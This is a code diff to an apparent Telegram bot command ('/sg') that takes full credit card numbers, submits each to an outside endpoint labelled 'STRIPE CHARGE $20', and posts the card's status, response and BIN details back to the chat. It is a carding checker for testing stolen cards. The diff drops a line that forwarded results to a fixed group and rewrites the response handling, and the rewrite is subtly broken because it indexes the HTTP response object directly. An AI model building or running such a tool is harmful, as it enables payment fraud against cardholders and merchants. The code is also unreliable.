@@ -10,8 +10,6 @@ import requests
 import json
 session = requests.session()
 
-grp = "-1002122350640"
-
 @Client.on_message(filters.command('sg'))
 async def cmd_au(Client, message):
     try:
@@ -135,8 +133,9 @@ Retry After {after}s
                         # STARTED CHECKING CC#
                         tic = time.perf_counter()
                         authurl = f"https://pussabazar.a1h.in/api/api6.php?lista={fullcc}"
-                        reqone = session.get(authurl)
-                        result = reqone.text
+                        data = session.get(authurl)
+                        stuts = data["stuts"]
+                        respp = data["respp"]
                         fourthresp = f"""
 <b> STRIPE CHARGE $20   
 ━━━━━━━━━
@@ -193,7 +192,7 @@ Retry After {after}s
 <b> STRIPE CHARGE $20  
 ━━━━━━━━━
  Card - <code>{fullcc}</code> 
- Status - Processing...
+ Status - {stuts}
  Response - ■■■■□
 </b>
               """
@@ -213,7 +212,8 @@ Retry After {after}s
 <b>STRIPE CHARGE $20 
 ┏－－－－－－－－－－－－－－－－－－┒</b>
 ┠ Card - <code>{fullcc}</code> 
-{result}
+┠ Status - <b>Processing...</b>
+┠ Response - <b>{respp}</b>
 ┠－－－－－－－－－－－－－－－－
 ┠ BIN INFO
 ┠ Bin - {fbin} - {brand} - {type} - {level}
@@ -229,7 +229,6 @@ Retry After {after}s
             """
 
                         finalchk = await Client.edit_message_text(message.chat.id, sixchk.id, finalresp)
-                        await Client.send_message(grp,finalresp)
                         # ANTISPAM TIME SET
                         module_name = "antispam_time"
                         value = int(time.time())
